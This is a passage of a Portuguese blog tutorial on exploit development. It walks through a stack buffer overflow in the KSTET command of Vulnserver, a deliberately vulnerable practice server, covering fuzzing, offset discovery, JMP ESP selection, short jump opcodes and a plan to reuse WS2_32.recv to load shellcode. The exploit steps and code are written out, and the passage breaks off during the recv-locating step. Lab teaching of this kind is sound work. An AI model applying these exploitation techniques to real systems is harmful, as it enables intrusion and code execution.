---
layout: post
title: 'Criação de Exploits - Parte 4 - Estudo de caso: vulnserver KSTET com reaproveitamento
  da função WS2_32 Recv'
date: 2019-02-17 08:00:33.000000000 -03:00
type: post
parent_id: '0'
published: true
password: ''
status: publish
categories:
- Criação de Exploits
tags: []
meta:
  _edit_last: '1'
  _yoast_wpseo_content_score: '60'
  _yoast_wpseo_primary_category: '80'
  _aviaLayoutBuilder_active: ''
  _aviaLayoutBuilderCleanData: ''
  layout: ''
  sidebar: ''
  footer: ''
  header_title_bar: ''
  header_transparency: ''
  _avia_hide_featured_image: '0'
  _oembed_11d24a295390989a133e5ccfd3ca00d4: '<blockquote class="wp-embedded-content"
    data-secret="uRevVO2tPN"><a href="https://deceiveyour.team/2018/10/15/vulnserver-kstet-ws2_32-recv-function-re-use/">Vulnserver
    KSTET WS2_32 Recv Function Re-Use</a></blockquote><iframe class="wp-embedded-content"
    sandbox="allow-scripts" security="restricted" style="position: absolute; clip:
    rect(1px, 1px, 1px, 1px);" src="https://deceiveyour.team/2018/10/15/vulnserver-kstet-ws2_32-recv-function-re-use/embed/#?secret=uRevVO2tPN"
    data-secret="uRevVO2tPN" width="600" height="338" title="&#8220;Vulnserver KSTET
    WS2_32 Recv Function Re-Use&#8221; &#8212; Deceptive Security" frameborder="0"
    marginwidth="0" marginheight="0" scrolling="no"></iframe>'
  _oembed_time_11d24a295390989a133e5ccfd3ca00d4: '1550401782'
  _syntaxhighlighter_encoded: '1'
  _oembed_fed5c2eb2cbc2c071e8777091af473c2: "{{unknown}}"
  _yoast_wpseo_focuskw: Buffer Overflow reaproveitamento socket
  _yoast_wpseo_metadesc: Como realizar um Buffer Overflow reaproveitando o socket
    da conexão atual? Aprenda como realizar um buffer overflow e reaproveitar o socket
    para receber o shellcode.
  _yoast_wpseo_linkdex: '53'
  _av_alb_posts_elements_state: a:0:{}
  _av_el_mgr_version: '1.0'
  _av_alb_element_mgr_version: 1.0.1
  _av_css_styles: a:6:{s:7:"post_id";i:1868;s:8:"css_file";s:13:"post-1868.css";s:9:"timestamp";s:0:"";s:6:"status";s:6:"no_css";s:13:"processed_ids";a:0:{}s:13:"include_posts";a:0:{}}
author:
  login: helvio
  email: helvio_junior@hotmail.com
  display_name: Helvio Junior - M4v3r1ck - OSCE3 (OSEP + OSED + OSWE), OSCE, OSCP,
    eCXD, eMAPT, CEH
  first_name: Helvio
  last_name: Junior - M4v3r1ck - OSCE3 (OSEP + OSED + OSWE), OSCE, OSCP, eCXD, eMAPT,
    CEH
permalink: "/it/security/criacao-de-exploits/criacao-de-exploits-parte-4-estudo-de-caso-vulnserver-kstet-com-reaproveitamento-da-funcao-ws2_32-recv/"
---
<p>Ola pessoal,</p>
<p>Neste post vamos dar continuidade a nossa análise de caso do Vulnserver KSTET. Como característica este servidor é vulnerável a stack buffer overflow mas com um buffer extremamente pequeno, 66 bytes. Sendo assim no post anterior (<a href="https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-3-estudo-de-caso-vulnserver-kstet-com-egghunter/" target="_blank" rel="noopener noreferrer">Criação de Exploits – Parte 3 – Estudo de caso: vulnserver KSTET com egghunter </a>) fizemos a exploração deste mesmo server com egghunter e neste iremos explorar a reutilização da função WS2_32.recv para reler do nosso socket o shellcode e executa-lo.</p>
<p>Antes de dar continuidade eu gostaria de dar os créditos ao autor que me inspirou a criar este post Kevin Kirsche, segue abaixo o link do post original:</p>
<p><a href="https://deceiveyour.team/2018/10/15/vulnserver-kstet-ws2_32-recv-function-re-use/" target="_blank" rel="noopener noreferrer">https://deceiveyour.team/2018/10/15/vulnserver-kstet-ws2_32-recv-function-re-use/</a></p>
<p><!--more--></p>
<h2>O Exploit</h2>
<h3>0x01 - Fuzzing</h3>
<p>Antes de mais nada precisamos encontrar a nossa vulnerabilidade. Para isso vamos realizar um processo de fuzzing em cima do vulnserver.</p>
<p>Antes de iniciar o fuzzing, vamos conhecer um pouco mais da aplicação. Ao conectar na aplicação ela nos mostra uma mensagem de boas vindas e sugerindo a execução do comando HELP.</p>
<p>[sourcecode language="shell"]# nc 172.30.200.66 9999<br />
Welcome to Vulnerable Server! Enter HELP for help.<br />
[/sourcecode]</p>
<p>Ao executar o comando HELP a aplicação nos retorna os comandos disponíveis</p>
<p>[sourcecode language="shell"]# nc 172.30.200.66 9999<br />
Welcome to Vulnerable Server! Enter HELP for help.<br />
HELP<br />
Valid Commands:<br />
HELP<br />
STATS [stat_value]<br />
RTIME [rtime_value]<br />
LTIME [ltime_value]<br />
SRUN [srun_value]<br />
TRUN [trun_value]<br />
GMON [gmon_value]<br />
GDOG [gdog_value]<br />
KSTET [kstet_value]<br />
GTER [gter_value]<br />
HTER [hter_value]<br />
LTER [lter_value]<br />
KSTAN [lstan_value]<br />
EXIT<br />
[/sourcecode]</p>
<p>Enquanto isso em sua console principal a aplicação mostra que ocorreu uma conexão</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/00-2019-02-16_124240.png"><img class="alignnone size-full wp-image-1874" src="{{ site.baseurl }}/assets/2019/02/00-2019-02-16_124240.png" alt="" width="682" height="348" /></a></p>
<p>Para o processo de fuzzing vamos utilizar a aplicação spike, como sempre ao conectar no servidor ele retorna essa mensagem de boas vindas temos que informar para o spike ler essa mensagem antes de enviar os comandos desejados.</p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/01-fuzz.spk"></script></p>
<p>Usando este arquivo do spike (demonstrado acima) iremos realizar o fuzzing na porção kstet_value do comando depois de ler a mensagem de boas vindas. Anexe o vulnserver no Immunity Debugger e execute o comando abaixo:</p>
<p>[sourcecode language="shell"]root@M4v3r1cK:~/vulnserver/exploit2_WS2_32_Recv# generic_send_tcp 172.30.200.66 9999 01-fuzz.spk 0 0<br />
Total Number of Strings is 681<br />
Fuzzing<br />
Fuzzing Variable 0:0<br />
line read=Welcome to Vulnerable Server! Enter HELP for help.<br />
Fuzzing Variable 0:1<br />
Variablesize= 5004<br />
Fuzzing Variable 0:2<br />
Variablesize= 5005<br />
Fuzzing Variable 0:3<br />
Variablesize= 21<br />
^C<br />
[/sourcecode]</p>
<p>Logo na primeira interação (demonstrada abaixo) o vulnserver travou em nosso debug.</p>
<p>[sourcecode language="shell"]Fuzzing Variable 0:1<br />
Variablesize= 5004<br />
[/sourcecode]</p>
<p>Observe a saída do spike (demonstrada acima), ela nos diz que fou realizado o fuzzing na primeira variável (como os computadores iniciam em zero, nossa primeira variável é referenciada como 0). No outro lado dos dois pontos, podemos ver que temos a segunda interação do fuzzing representada pelo 1. Na outra linha o spike nos mostrou o tamanho do buffer que ele enviou, neste caso 5004 bytes. Agora podemos ver como isso ficou no Immunity Debugger:</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/01-2019-02-16_124535.png"><img class="alignnone size-full wp-image-1878" src="{{ site.baseurl }}/assets/2019/02/01-2019-02-16_124535.png" alt="" width="1120" height="956" /></a></p>
<p>Pode-se observar que o spike enviou a requisição conforme abaixo:</p>
<p>[sourcecode language="shell"]KSTET /.:/AAAAAAAAA........<br />
[/sourcecode]</p>
<p>Provavelmente 5000 A com o prefixo /.:/</p>
<p>Vamos duplicar este exploit em python criando então uma prova de conceito (PoC)</p>
<p>&nbsp;</p>
<h3>0x02 - Exploit de PoC</h3>
<p>Daqui para frente utilizaremos scripts Python para realizar todo nosso processo. Como ja sabemos nosso Overflow ocorreu com 5000 bytes + 4 caracteres <strong>/.:/ </strong>então vamos reproduzir isso:<strong><br />
</strong></p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/02-poc.py"></script></p>
<p>Executando nosso PoC temos a seguinte saída:</p>
<p>[sourcecode language="shell"]root@M4v3r1cK:~/vulnserver/exploit2_WS2_32_Recv# ./02-poc.py<br />
[*] Enviando requisicao maliciosa ...<br />
[/sourcecode]</p>
<p>E o crash ocorreu:<br />
<a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/01-2019-02-16_124535.png"><img class="alignnone size-full wp-image-1878" src="{{ site.baseurl }}/assets/2019/02/01-2019-02-16_124535.png" alt="" width="1120" height="956" /></a></p>
<p>Agora que temos uma prova de conceito funcional, vamos aprofundar e determinar o tipo de overflow (se é uma substituição simples do EIP, SEH e etc...) e em que offset isso ocorre.</p>
<h3>0x03 - Determinando o tipo de Exploit e o Offset de controle</h3>
<p>Olhando na imagem (do immunity Debugger) podemos observar que o registrador EIP foi substituido por:</p>
<p>[sourcecode language="shell"]41414141<br />
[/sourcecode]</p>
<p>Se você está lendo nossos posts de forma sequencial ou ja realizou uma outra exploração de Buffer Overflow sabe que A (maiúsculo) corresponde ao hexa 41. Bom! agora sabemos que temos um stacked buffer overflow de simples substituição do EIP, ou também conhecido como <em>vanilla EIP overwrite</em>. Agora precisamos saber em que ponto do nosso 5000 bytes está ocorrendo a substiruição do EIP. Vamos usar uma ferramenta da <em>metasploit</em> para gerar um buffer único e depois identificar em quem ponsto a substituição ocorreu.</p>
<p>Gerando o buffer único:</p>
<p>[sourcecode language="shell"]root@M4v3r1cK:~/vulnserver/exploit2_WS2_32_Recv# msf-pattern_create -l 5000<br />
[/sourcecode]</p>
<p>Agora basta copiar e colar este buffer em nosso arquivo python conforme demonstrado abaixo:</p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/ 03-find_offset.py"></script></p>
<p>Execute este script e veja como ficou o registrador EIP:</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/03-2019-02-16_135338.png"><img class="alignnone size-full wp-image-1895" src="{{ site.baseurl }}/assets/2019/02/03-2019-02-16_135338.png" alt="" width="505" height="319" /></a></p>
<p>Agora basta usar o comando msf-pattern_offset com o valor de EIP para identificar a posição exata do buffer:</p>
<p>[sourcecode language="shell"]root@M4v3r1cK:~/vulnserver/exploit2_WS2_32_Recv# msf-pattern_offset -l 5000 -q 41326341<br />
[*] Exact match at offset 66<br />
[/sourcecode]</p>
<p>Isso indica que o EIP inicia no offset 66, ou seja, na posição 66, em outras palavras, temos 66 bytes de caracteres antes do EIP + 4 bytes do EIP e depois o restante do buffer. Vamos atualizar nosso exploit e verificar se temos o offset correto.</p>
<h3>0x04 - Verificando o Offset</h3>
<p>Vamos atualizar nosso exploit PoC com o tamanho do Offset conforme abaixo:<br />
<script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/ 04-checking_eip.py"></script></p>
<p>E executamos ele obtendo o resultado abaixo:</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/04-2019-02-16_135808-2.png"><img class="alignnone size-full wp-image-1892" src="{{ site.baseurl }}/assets/2019/02/04-2019-02-16_135808-2.png" alt="" width="1116" height="969" /></a></p>
<p>Isso indica que temos um exploit funcional que substituiu o EIP pelos nossos Bs, hexa 0x42, e que o ESP está apontado para o ponto exatamente posterior ao EIP, onde estão nossos Cs.</p>
<p>Porém olhando um pouco mais a fundo em nossa pilha de memória podemos ver que temos um numero limitado de Cs mesmo tendo enviado 500, este número é exatamente 20 bytes que pode ser calculado de 2 formas diferentes:</p>
<ol>
<li>Contando: Cada linha tem 4 bytes e no stack temos 5 linhas, então 4*5 = 20 bytes</li>
<li>Calculando: endereço inicial do stack 00FEF9F8, o primeiro caractere depois dos C está localizado em 00FEFA0C, então 00FEFA0C - 00FEF9F8 = 20 bytes</li>
</ol>
<p>Mas e dai que só tem 20 bytes? Isso indica que só teremos estes 20 bytes + os 66 bytes (antes do EIP) para realizar todo nosso processo de exploração, e um shellcode pequeno gerado pelo msfvenom tem pelo menos 354 bytes. Então teremos que ser criativos.</p>
<p><strong>Nota importante:</strong> Cuidado com os próximos passos para não continuar usando o buffer maior que 20 bytes após o endereço do EIP, pois isso causará problemas futuros.</p>
<h3>0x05 - Saltando para nosso Buffer</h3>
<p>O próximo passo em nosso processo de exploração será saltar para os nossos Cs, para isso precisaremos localizar um endereço de memória (sem o nullbyte 0x00) que faça o JMP ESP ou CALL ESP, podemos usar o script Mona para nos ajudar nessa tarefa. Note que vou utlizar o -n para ignorar os endereços iniciados por null byte.</p>
<p>[sourcecode language="shell"]!mona jmp -n -r ESP<br />
[/sourcecode]</p>
<p>Este comando nos retornou 9 opções</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/05-2019-02-17_095741.png"><img class="alignnone size-full wp-image-1897" src="{{ site.baseurl }}/assets/2019/02/05-2019-02-17_095741.png" alt="" width="1116" height="968" /></a></p>
<p>Porém a nossa escolha foi a primeira:</p>
<p>[sourcecode language="shell"]Log data, item 11<br />
 Address=625011AF<br />
 Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)<br />
[/sourcecode]</p>
<p>Por hora não conhecemos nenhum badchar, a não ser os classisos para um servidor baseado em comandos ASCII (0x00 - null byte, 0x0d - '\r', 0x0a - '\n'). Adicionamente este endereço não tem outras proteções como SafeSEH e ASLR e é uma DLL do proprio sistema, o que facilita as coisas pois não corre-se o risco do endereço se alterar com a mudança de sistema operacional.</p>
<p>Então vamos atualizar nosso exploit para realizar esse JMP ESP. Nele utilizaremos uma função chamada pack da biblioteca struct para alterar o endereço entre big endian e little endian.</p>
<p>Segue nosso exploit atualizado:</p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/ 05-jumping-esp.py"></script></p>
<p>Antes de rodar nosso exploit novamente, no Immunity Debbuger clique no botão <strong><em>Goto address in Dissassembler </em></strong>demonstrado abaixo:</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/06-2019-02-16_150507.png"><img class="alignnone size-full wp-image-1899" src="{{ site.baseurl }}/assets/2019/02/06-2019-02-16_150507.png" alt="" width="1120" height="236" /></a></p>
<p>E digite o endereço da instrução JMP ESP escolhida:</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/06-2019-02-16_150539.png"><img class="alignnone size-full wp-image-1900" src="{{ site.baseurl }}/assets/2019/02/06-2019-02-16_150539.png" alt="" width="1120" height="274" /></a></p>
<p>Se certifique que está no endereço correto pois algumas vezes é necessário fazer este processo mais de uma vez para alcançar o endereço correto. Uma vez no endereço correto pressionne F2 para adicionar um breakpoint.</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/06-2019-02-16_150610.png"><img class="alignnone size-full wp-image-1901" src="{{ site.baseurl }}/assets/2019/02/06-2019-02-16_150610.png" alt="" width="1120" height="169" /></a></p>
<p>Agora execute o exploit e veja a aplicação parando no breakpoint selecionado</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/05-2019-02-17_101711.png"><img class="alignnone size-full wp-image-1903" src="{{ site.baseurl }}/assets/2019/02/05-2019-02-17_101711.png" alt="" width="1116" height="970" /></a></p>
<p>Observe que essa parada foi devido ao breakpoint, sabemos isso por causa do texto na barra de status "Breakpoint at essfunc.625011AF" e não outro erro como <em>access violation</em>.</p>
<p>Para dar continuidade pressione F7 (Step Into) para permitir o JMP para o endereço do ESP que por sua vez é a localização dos nossos Cs</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/05-2019-02-17_101916.png"><img class="alignnone size-full wp-image-1904" src="{{ site.baseurl }}/assets/2019/02/05-2019-02-17_101916.png" alt="" width="1116" height="969" /></a></p>
<h3>0x06 - Saltando para o buffer maior</h3>
<p>Até este ponto conseguimos saltar para o nosso ESP que é um buffer com 20 bytes, que não da p/ fazer quase nada, mas é mais que suficiente para que possamos fazer um salto para traz indo para nossos As que é um buffer um pouco maior (66 bytes)</p>
<p>Mas como fazemos isso? Há diversas formas, vamos explorar uma delas aqui, mas para isso precisamos saber onde estamos.</p>
<p>Olhando na imagem anterior vemos o seguinte cenário:</p>
<p>[sourcecode language="shell"]00EDF9F8   43               INC EBX<br />
[/sourcecode]</p>
<p>Estamos no endereço de memória 00EDF9F8. Mas onde está o início dos nossos As?</p>
<p>[sourcecode language="shell"]00EDF9B2   41               INC ECX<br />
[/sourcecode]</p>
<p>Então podemos fazer alguns cálculos para realizar a movimentação necessária</p>
<p>[sourcecode language="shell"]00EDF9F8 (Localização atual) - 00EDF9B2 (Posição desejada) = Valor em Hexa: 46 ou Valor em Decimal: 70<br />
[/sourcecode]</p>
<p>Para realizar os calculos do ESP de forma segura vamos colocar seu valor em EDX:</p>
<p>[sourcecode language="shell"]PUSH ESP<br />
POP EDX<br />
[/sourcecode]</p>
<p>E posteriormente subtrair 0x46 (decimal 70) de seu valor:</p>
<p>[sourcecode language="shell"]SUB EDX,0x46<br />
[/sourcecode]</p>
<p>E por fim saltar para o endereço desejado:</p>
<p>[sourcecode language="shell"]JMP EDX<br />
[/sourcecode]</p>
<p>Caso não esteja familiarizado o mestasploit tem uma ferramenta para nos ajudar neste processo de criação dos OPCODES chamada <em>msf-nasm_shell</em> conforme demonstrado abaixo:</p>
<p>[sourcecode language="shell"]root@M4v3r1cK:~# msf-nasm_shell<br />
nasm &amp;amp;amp;amp;gt; PUSH ESP<br />
00000000  54                push esp<br />
nasm &amp;amp;amp;amp;gt; SUB EDX,0x46<br />
00000000  83EA46            sub edx,byte +0x46<br />
nasm &amp;amp;amp;amp;gt; JMP EDX<br />
00000000  FFE2              jmp edx<br />
nasm &amp;amp;amp;amp;gt;<br />
[/sourcecode]</p>
<p>Segue abaixo o exploit atualizado:</p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/ 06-stage1-option1.py"></script></p>
<p>Este é um dos métodos de realizar este processo, e o escolhido por mim neste exploit, porém há métodos mais econômicos do ponto de vista de consumo de espaço uma vez que temos somente 20 bytes. Como por exemplo o JUMP para 72 bytes para traz (70 bytes desejados + 2 consumido pela da instrução de JMP)</p>
<p>[sourcecode language="shell"]root@M4v3r1cK:~# msf-nasm_shell<br />
nasm &amp;amp;amp;amp;gt; JMP short -72<br />
00000000  EBB6              jmp short 0xffffffb8<br />
nasm &amp;amp;amp;amp;gt;<br />
[/sourcecode]</p>
<p>Segue abaixo a segunda opção:<br />
Note que como neste nosso exploit nesse primeiro estágio só precisamos realizar o salto para nosso segundo estágio (nossos As) não faz diferença no método utilizado, mas caso precisasse realizar outras operações nestes restritos 20 bytes essa segunda opção certamente seria a melhor opção.</p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/06-stage1-option2.py"></script></p>
<p>Reiniciando o Immunity, redefinindo nosso breakpoint no commando JMP ESP e então pressionando F7 quando a execução parar no breakpoint chegaremos ao resultado abaixo:</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/06-2019-02-16_150857.png"><img class="alignnone size-full wp-image-1914" src="{{ site.baseurl }}/assets/2019/02/06-2019-02-16_150857.png" alt="" width="1120" height="955" /></a></p>
<p>Neste ponto temos pelo menos 2 formar de continuar com o exploit:</p>
<ol>
<li>Verificando a possibilidade de enviar o shellcode através de outro comando do servidor e buscando essa área de memória com egghunter (este processo é descrito no post <a href="https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-3-estudo-de-caso-vulnserver-kstet-com-egghunter/" target="_blank" rel="noopener noreferrer">Criação de Exploits – Parte 3 – Estudo de caso: vulnserver KSTET com egghunter </a>)</li>
<li>Reutilizando a função WS2_32.recv (que foi a função utilizada para ler nosso buffer inicial) para ler da nossa própria conexão um novo buffer (shellcode) e posteriormente executa-lo. Isso parece meio confuso no início, mas não se preocupe mais a frente explicarei mais detalhadamente este processo.</li>
</ol>
<p>Neste post abordaremos a opção 2: reutilização da função WS2_32.recv.</p>
<h3>0x07 - Entendendo a engenharia e utilização da função WS2_32.recv</h3>
<p>Não existe outra forma melhor de entender o funcionamento deste processo sem entender o que a nossa aplicação está executando, então vamos ao código da aplicação:</p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/vulnserver.c"></script></p>
<p>Analisando o fluxo da aplicação percebemos que a mesma abre um socket na porta especificada, e quando um cliente se conecta é criada uma nova thread que executa a função <em><strong><span class="pl-en">ConnectionHandler</span></strong></em> (aproximadamente linha 160) esta é a função responsável por tratar da conexão do cliente. Indo mais a fundo dentro dessa função, depois da conexão estabelecida a aplicação entre em um loop para tratar as requisições vindas do cliente e dentro do loop chama a função <em><strong>recv</strong></em> que é responsável por receber s dados vindos do nosso cliente através do socket.</p>
<p>Bom, como a função WS2_32.recv funciona? Se olharmos na documentação do MSDN (<a href="https://docs.microsoft.com/en-us/windows/desktop/api/winsock/nf-winsock-recv" target="_blank" rel="noopener noreferrer">localizada aqui</a>) podemos ver o seguinte:</p>
<p>[sourcecode language="c"]int recv(<br />
    SOCKET s,<br />
    char   *buf,<br />
    int    len,<br />
    int    flags<br />
);<br />
[/sourcecode]</p>
<p>Sendo assim a função <em><strong>recv</strong> </em>recebe 4 parâmetros sendo eles:</p>
<ol>
<li><strong>SOCKET s</strong>: file descriptor do socket da conexão do cliente;</li>
<li><strong>char *buf</strong>: ponteiro de memória do buffer para o qual os dados serão recebidos e copiados;</li>
<li><strong>int len</strong>: tamanho dos dados a serem recebidos do socket;</li>
<li><strong>int flags</strong>: as flags influenciam no comportamento da função, para nosso estudo podemos ignorar estes parâmetro.</li>
</ol>
<p>Continuando na análise do nosso código vemos que a função WS2_32.recv (em nosso código) é chamada conforme abaixo:</p>
<p>[sourcecode language="c"]Result = recv(Client, RecvBuf, RecvBufLen, 0);<br />
[/sourcecode]</p>
<p>O que vamos colocar como foco é o parâmetro RecvBufLen que um pouco antes é definido como:</p>
<p>[sourcecode language="c"]int RecvBufLen = DEFAULT_BUFLEN;<br />
[/sourcecode]</p>
<p>Que por sua vez a variável estática DEFAULT_BUFLEN fou definida anteriormente como:</p>
<p>[sourcecode language="c"]#define DEFAULT_BUFLEN 4096<br />
[/sourcecode]</p>
<p>Isso indica que nossa aplicação realiza a leitura de 4096 bytes. Afe!!!, não entendi nada mas nosso overflow não está ocorrendo com 66 bytes? Da onde vem esse 4096? Vamos continuar a análise que espero explicar isso.</p>
<p>Extraindo a sessão de código que trata do nosso comando vulnerável KSTET temos o seguinte código:</p>
<p>[sourcecode language="c"]} else if (strncmp(RecvBuf, &quot;KSTET &quot;, 6) == 0) {<br />
    char *KstetBuf = malloc(100);<br />
    strncpy(KstetBuf, RecvBuf, 100);<br />
    memset(RecvBuf, 0, DEFAULT_BUFLEN);<br />
    Function2(KstetBuf);<br />
    SendResult = send( Client, &quot;KSTET SUCCESSFUL\n&quot;, 17, 0 );<br />
}<br />
[/sourcecode]</p>
<p>Vamos estudar linha a linha:</p>
<ul>
<li><strong>char *KstetBuf = malloc(100)</strong>: cria a variável KstetBuf e aloca uma espaço de memória de 100 bytes para ela;</li>
<li><strong>strncpy(KstetBuf, RecvBuf, 100)</strong>: copia os 100 primeiros bytes do buffer recebido pelo socket para essa variável recem criada <em>KstetBuf</em> ;</li>
<li><strong>memset(RecvBuf, 0, DEFAULT_BUFLEN)</strong>: preenche todo o buffer (variável <em>RecvBuf</em>) com zeros;</li>
<li><strong>Function2(KstetBuf)</strong>: chama a função <em>Function2</em> passando como parâmetro a variável KstetBuf que por sua vez detem 100 bytes;</li>
</ul>
<p>Até ai tudo OK, sem nenhuma vulnerabilidade e nhum problema, agora vamos analisar o código da função chamada <em><strong>Function2</strong> </em>conforme abaixo:</p>
<p>[sourcecode language="c"]void Function2(char *Input) {<br />
	char Buffer2S[60];<br />
	strcpy(Buffer2S, Input);<br />
}<br />
[/sourcecode]</p>
<p>Mais uma vez vamos a análise linha a linha:</p>
<ul>
<li><strong>char Buffer2S[60]</strong>: cria uma variável com tamanho fixo de 60 bytes;</li>
<li><strong>strcpy(Buffer2S, Input)</strong>: realiza a copia do parâmetro recebido, de nome Input.</li>
</ul>
<p>Nesta sessão podemos perceber a vulnerabilidade no strcpy onde se tenta copiar os 100 bytes passados como parâmetro para dentro de um buffer de 60 bytes. Sendo assim novo overflow consiste em controlar o fluxo da aplicação que ao invés dela continuar seu fluxo normal e executar o código <em><strong>SendResult = send( Client, "KSTET SUCCESSFUL\n", 17, 0 )</strong></em> a mesma vai saltar para o endereço que desejamos e controlamos no EIP.</p>
<p>Isso explica algumas coisas, o buffer de 66 bytes, pois nunca é o tamanho exato do tamanho da variável que houve o overflow (caso tenha duvida ou não esteja muito familiarizado com este processo sugiro a leitura do post que fiz explicando a teoria do buffer overflow <a href="https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-0-um-pouco-de-teoria/" target="_blank" rel="noopener noreferrer">Criação de Exploits – Parte 0 – Um pouco de teoria</a>). Explica também porque temos um buffer tão limitado de 20 bytes após o EIP.</p>
<p>Até agora entendemos o porque o overflow ocorre, o porque temos um tamanho tão limitado após o EIP, mas ainda não entramos no como utilizaremos a função <strong><em>recv</em> </strong>a nosso favor para receber o nosso shellcode.</p>
<p>Como vimos a aplicação em seu fluxo normal executa as seuintes operações:</p>
<ol>
<li>Realiza o bind na porta desejada (por padrão 9999);</li>
<li>Quando o cliente se conecta chama a função <em><strong><span class="pl-en">ConnectionHandler</span></strong></em> em uma nova thread para tratar das requisições do cliente;</li>
<li>Dentro da função <em><strong><span class="pl-en">ConnectionHandler</span></strong></em>, fica em um loop infinito chamando a função WS2_32.recv para receber os dados do cliente e trata os dados recebidos conforme os IFs;</li>
<li>Em nosso comando vulnerável (KSTET) chama a função de nome <em><strong>Function2</strong>;</em></li>
<li>Depois retorna dados para o cliente;</li>
</ol>
<p>O que pretendemos fazer é alterar este fluxo que depois do nosso <em>crash</em> possamos chamar de forma deliberada a função <em><strong>recv</strong> </em>lendo um novo buffer de nosso cliente, só que dessa vez sem os limitadores impostos pela aplicação, pois nós que definiremos o tamanho do buffer, e mandando que o <em><strong>recv</strong> </em>escreva os novos dados recebidos (que será nosso shellcode) em uma área estratégica para que possamos executa-lo.</p>
<p>Basicamente temos a seguinte anatomia após o nosso overflow:</p>
<ul>
<li>66 bytes: que será nosso segundo estágio</li>
<li>4 bytes: endereço do EIP</li>
<li>20 bytes: stagio1 que fará o JUMP para o segundo estágio</li>
</ul>
<p>Dentro do segundo estágio (66 bytes) nos vamos chamar a função WS2_32.recv para que ela leia do nosso socket mais 520 bytes e o grave no endereço de memória antes do final dos 66 bytes para que após a leitura destes dados possamos executar o nosso shellcode.</p>
<p>Vamos dar uma olhada na imagem abaixo logo antes da chamada da função <em><strong>recv</strong></em></p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/07-2019-02-17_131457.png"><img class="alignnone size-full wp-image-1925" src="{{ site.baseurl }}/assets/2019/02/07-2019-02-17_131457.png" alt="" width="1116" height="664" /></a></p>
<p>Note que a proxima instrução a ser executada é a CALL EAX e que EAX detém o endereço de memória da função WS2_32.recv, e na pilha para a chamada da função tem-se 4 parâmetros conforme abaixo:</p>
<ol>
<li><strong>Socket = 0x50</strong>: Nosso file descripto do socket do cliente;</li>
<li><strong>Buffer = 0x00E2F9F0</strong>: Endereço de memória onde será gravado os dados recebidos pelo socket;</li>
<li><strong>BufSize = 0x0208 (Decimal 520)</strong>: Tamanho do buffer que deve ser lido;</li>
<li><strong>Flags = 0</strong>: Podemos ignorar.</li>
</ol>
<p>Sendo assim observe que coloquei estratégicamente o endereço onde será gravado os novos dados recebidos para logo depois da minha posição atual de execução, sendo assim após a chamada da função WS2_32.recv continua-se a execução até chegar no shellcode.</p>
<p>Agora observer abaixo logo após a chamada da função <em><strong>recv,</strong></em> para efeitos didáticos o shellcode que passei são 520 E que tem hexa 0x45</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/07-2019-02-17_131525.png"><img class="alignnone size-full wp-image-1926" src="{{ site.baseurl }}/assets/2019/02/07-2019-02-17_131525.png" alt="" width="1116" height="546" /></a></p>
<p>Do ponto de vista do meu código foi chamado da seguinte forma:</p>
<p>[sourcecode language="python"]#!/usr/bin/python<br />
# -*- coding: utf-8 -*-<br />
...<br />
...<br />
...<br />
exp.send(buffer)<br />
sleep(1)<br />
shellcode = &quot;E&quot; * 520<br />
exp.send(shellcode)<br />
[/sourcecode]</p>
<p>Onde a variável <em><strong>buffer</strong> </em>detém todo o código para fazer o buffer overflow e a chamada da função <em><strong>recv</strong> </em>(veremos esse código mais a frente) e a variável <em><strong>shellcode</strong> </em>são 520 Es</p>
<p>&nbsp;</p>
<h3>0x08 - Encontrando a função WS2_32.recv</h3>
<p>Agora que sabemos que iremos usar a função WS2_32.recv precisamos encontra-la em nosso código, o que sabemos é que ela ja foi usada em nossa aplicação, sendo assim ela estará em nossa IAT (Import Address Table) e em algum lugar da nossa aplicação.</p>
<p>Para localiza-la reinicie o Immunity Debbuger, anexe a aplicação e no painel superior esquerdo clique com o botão direito do mouse e clique em View &gt; Module 'vulnserv', caso a opção Module 'vulnserv' não apareça é porque você ja está neste módulo, se isso for verdade na barra de titulo você verá algo como 'module vulnserv'.</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/08-2019-02-16_172737.png"><img class="alignnone size-full wp-image-1935" src="{{ site.baseurl }}/assets/2019/02/08-2019-02-16_172737.png" alt="" width="1120" height="967" /></a></p>
<p>Agora no painel superior esquerdo clique com o botão direito do mouse e clique em Search for &gt; All intermodular calls</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/08-2019-02-16_172838.png"><img class="alignnone size-full wp-image-1936" src="{{ site.baseurl }}/assets/2019/02/08-2019-02-16_172838.png" alt="" width="1120" height="972" /></a></p>
